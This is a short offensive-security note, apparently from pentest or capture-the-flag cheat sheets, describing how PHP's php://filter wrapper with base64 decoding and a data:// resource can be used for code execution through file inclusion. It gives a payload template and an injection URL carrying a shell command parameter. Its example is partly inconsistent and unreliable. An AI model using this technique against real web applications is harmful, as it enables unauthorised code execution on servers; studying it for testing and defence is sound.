PHP wrappers like `php://filter` can enable code execution by transforming files on the fly. Attackers can use the `convert.base64-decode` filter to execute base64-encoded payloads.

**Example:**
1. Use PHP payload 
	`<?php payload; ?>`

2. Encode the value of the payload to base64 and use the filter.
	`php://filter/convert.base64-decode/resource=data://plain/text,BASE64_ENCODED_PAYLOAD&cmd=ls -al flags`

Note: Avoid including `&cmd` in the input to prevent encoding errors.